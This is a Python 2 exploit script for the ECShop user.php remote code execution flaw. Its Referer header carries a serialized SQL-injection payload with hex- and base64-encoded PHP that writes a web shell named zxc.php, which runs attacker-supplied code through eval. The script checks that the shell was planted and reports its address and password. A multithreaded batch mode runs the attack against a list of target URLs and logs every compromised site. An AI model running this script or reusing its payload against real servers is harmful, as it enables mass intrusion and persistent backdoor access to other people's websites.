#coding:utf-8
#Author:LSA
#Description: ecshop rce(user.php)
#Date:20180902

import requests
import optparse
import os
import datetime
import Queue
import threading
import sys
from BeautifulSoup import BeautifulSoup
from requests.packages import urllib3

reload(sys) 
sys.setdefaultencoding('utf-8')

lock = threading.Lock()

q0 = Queue.Queue()
threadList = []
global succ
succ = 0
headers = {}
headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'
headers["Referer"] = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:290:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24797979275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a337034597935776148416e4c4363385033426f6343426c646d46734b435266554539545646743465486834654868644b547367507a346e4b513d3d2729293b2f2f7d,10-- -";s:2:"id";s:3:"'/*";}'''

def ecshop_getshell(tgtUrl,timeout):

	fullUrl = tgtUrl
	
	try:
		rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
	except requests.exceptions.Timeout:
		print 'Getshell failed! Error: Timeout'
		exit()
	except requests.exceptions.ConnectionError:
		print 'Getshell failed! Error: ConnectionError'
		exit()
	except:
		print 'Getshell failed! Error: Unkonwn error0'
		exit()
		
	if rst.status_code == 200:
		try:
			rst1 = requests.get(fullUrl.split('/user.php')[0]+'/zxc.php',timeout=timeout,verify=False)
			if rst1.status_code == 200:
				if rst1.text == '':
					print 'Getshell! Shell: ' + fullUrl.split('/user.php')[0] + '/zxc.php' + ' pwd: xxxxxx'
				
				else:
					
					soup = BeautifulSoup(rst1.text)
					if(soup.find('title')):
						print 'Getshell failed! Error title: ' + str(soup.title.string)
					else:
						print 'Getshell failed! ' + str(rst1.text[0:11])
			else:
				print 'Getshell failed! zxc.php ' + str(rst1.status_code)
				exit()
		except requests.exceptions.Timeout:
			print 'Getshell failed! Error: Timeout'

		except requests.exceptions.ConnectionError:
			print 'Getshell failed! Error: ConnectionError'
			exit()
		except:
			
			print 'Getshell failed! Error: Unkonwn error1'
			exit()
	else:
		print 'Getshell failed! status code: ' + str(rst.status_code)

def ecshop_getshell_batch(timeout,f4success,f4fail):
	urllib3.disable_warnings()
	global countLines
	while(not q0.empty()):
		fullUrl = q0.get()
		#print fullUrl
		qcount = q0.qsize()
		print 'Checking: ' + fullUrl + '---[' +  str(countLines - qcount) + '/' + str(countLines) + ']'
		
		try:
			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)

		except requests.exceptions.Timeout:
			#print 'Getshell failed! Error: Timeout'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
			lock.release()	
			continue

		except requests.exceptions.ConnectionError:
			#print 'Getshell failed! Error: ConnectionError'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: ConnectionError'+'\n')
			lock.release()	
			continue

		except:
			#print 'Getshell failed! Error: Unkonwn error'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
			lock.release()	
			continue

		if rst.status_code == 200:
			try:
				rst1 = requests.get(fullUrl.split('/user.php')[0]+'/zxc.php',timeout=timeout,verify=False)

				if rst1.status_code == 200:

					
					if rst1.text == '':
						shellAddr = fullUrl.split('/user.php')[0] + '/zxc.php' + ' pwd: xxxxxx'
						print 'Getshell! Shell: ' + shellAddr
						lock.acquire()
						f4success.write(fullUrl+': shell: ' + shellAddr + '\n')
						lock.release()
						global succ
						succ = succ + 1
					else:
						soup = BeautifulSoup(rst1.text)
						if(soup.find('title')):
							errorState = str(soup.title.string)
						else:
							errorState = 'Getshell failed!' + str(rst1.text[0:11])
					
						#print 'Getshell failed! Error: ' + errorState
						lock.acquire()
						f4fail.write(fullUrl+': '+errorState+'\n')
						lock.release()
				else:
				
					errorState = 'Getshell failed! Error: zxc.php ' + str(rst1.status_code)
					lock.acquire()
					f4fail.write(fullUrl+': '+errorState+'\n')
					lock.release()
			except requests.exceptions.Timeout:
				#print 'Getshell failed! Error: Timeout'
				lock.acquire()
				f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
				lock.release()	
				continue

			except requests.exceptions.ConnectionError:
				#print 'Getshell failed! Error: ConnectionError'
				lock.acquire()
				f4fail.write(fullUrl+': '+'Getshell failed! Error: ConnectionError'+'\n')
				lock.release()	
				continue			

			except:
				#print 'Getshell failed! Error: Unkonwn error'
				lock.acquire()
				f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
				lock.release()	
				continue			

		

		else:
			#print 'Getshell failed! status code: ' + str(rst.status_code)
			lock.acquire()
			f4fail.write(fullUrl+': '+str(rst.status_code)+'\n')
			lock.release()

	 


if __name__ == '__main__':

	print '''
		****************************************************
		*          ecshop getshell(user.php-rce)           *
		*				      Coded by LSA *
		****************************************************
		'''
	
	parser = optparse.OptionParser('python %prog ' +'-h (manual)',version='%prog v1.0')
	parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

	parser.add_option('-f', dest='tgtUrlsPath', type ='string', help='urls filepath')
	
	parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
	
	parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')
	(options, args) = parser.parse_args()
	
	
	timeout = options.timeout
	
	tgtUrl = options.tgtUrl

	if tgtUrl:
		ecshop_getshell(tgtUrl,timeout)
	
	
	
	if options.tgtUrlsPath:
		tgtFilePath = options.tgtUrlsPath
		threads = options.threads
		nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
		os.mkdir('batch_result/'+str(nowtime))
		f4success = open('batch_result/'+str(nowtime)+'/'+'success.txt','w')
		f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
		urlsFile = open(tgtFilePath)
		global countLines
		countLines = len(open(tgtFilePath,'rU').readlines())

		print '===Total ' + str(countLines) + ' urls==='

		for urls in urlsFile:
			fullUrls = urls.strip()
			q0.put(fullUrls)
		for thread in range(threads):
			t = threading.Thread(target=ecshop_getshell_batch,args=(timeout,f4success,f4fail))
			t.start()
			threadList.append(t)
		for th in threadList:
			th.join()


		print '\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###'
		print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
		f4success.close()
		f4fail.close()

	
	


